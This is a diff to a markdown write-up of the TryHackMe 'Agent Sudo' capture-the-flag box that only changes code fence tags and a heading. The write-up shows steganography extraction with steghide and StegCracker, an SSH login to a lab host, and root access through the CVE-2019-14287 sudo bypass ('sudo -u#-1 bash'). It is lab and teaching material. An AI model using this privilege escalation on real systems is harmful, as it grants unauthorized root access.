@@ -352,7 +352,7 @@ Next time, I will definitely try [StegSeek](https://github.com/RickdeJager/stegs
 
 I learned about [Stegsolve](https://wiki.bi0s.in/steganography/stegsolve/) which is a really cool little utility, but, sadly, not helpful here. The next thing to try is [steghide](https://www.kali.org/tools/steghide/):
 
-```shell
+```
                                                          
 ┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
 └─$ steghide --extract -sf cute-alien.jpg
@@ -373,7 +373,7 @@ Your buddy,
 
 Coincidentally, the lethargic StegCracker process also just finished, giving us another route to the message.
 
-```shell
+```
 ┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
 └─$ stegcracker cute-alien.jpg
 StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
@@ -406,7 +406,7 @@ Your buddy,
 ```
 
 Let's log in via `ssh` and find our user flag.
-```shell
+```
 ┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
 └─$ ssh ----s@10.10.108.206
 ----s@10.10.108.206's password: 
@@ -441,7 +441,7 @@ While the secret agents certainly have more knowledge about image-based cryptogr
 
 Now let's try to get root. First, I check to see what our friend `----s` has `sudo` permissions to run:
 
-```shell
+```
 ----s@agent-sudo:~$ sudo -l
 [sudo] password for ----s: 
 Matching Defaults entries for ----s on agent-sudo:
@@ -454,7 +454,7 @@ User ----s may run the following commands on agent-sudo:
 
 Well, that is lucky. I immediately google this command and discover CVE-2019-14287. This exploit works due to some remarkably simple logic. The security policy applied – which allows `----s` to run `bash` as any user except root – is quite sensible. However, unfortunately, `sudo` faithfully interprets `#-1` after the `-u` user flag and, upon checking for user number `-1`,  will run as user `0`: `root`.
 
-```shell     
+```    
 ----s@agent-sudo:~$ sudo -u#-1 bash
 root@agent-sudo:~# whoami
 root
@@ -462,7 +462,7 @@ root
 
 This can also be done with `4294967295` instead of `-u`. h/t [WhiteSource](https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/)
 
-```shell
+```
 ----s@agent-sudo:~$ sudo -u#4294967295 bash
 [sudo] password for ----s: 
 root@agent-sudo:~# whoami
@@ -472,7 +472,7 @@ root
 Pretty crazy! 
 
 Now for the final spy message of the box:
-```shell
+```
 root@agent-sudo:/# cd /root
 root@agent-sudo:/root# ls
 root.txt
@@ -489,5 +489,5 @@ By,
 
 ```
 
-### Notes
+### Lessons Learned
 I learned a lot from this box and enjoyed it a lot. In particular, I think building a familiarity with `binwalk` and the various tricks and utilities related to [steganography](https://en.wikipedia.org/wiki/Steganography) - concealing data in other data or objects - will be useful down the road. Understanding and using CVE-2019-14287 was quite helpful, as well.
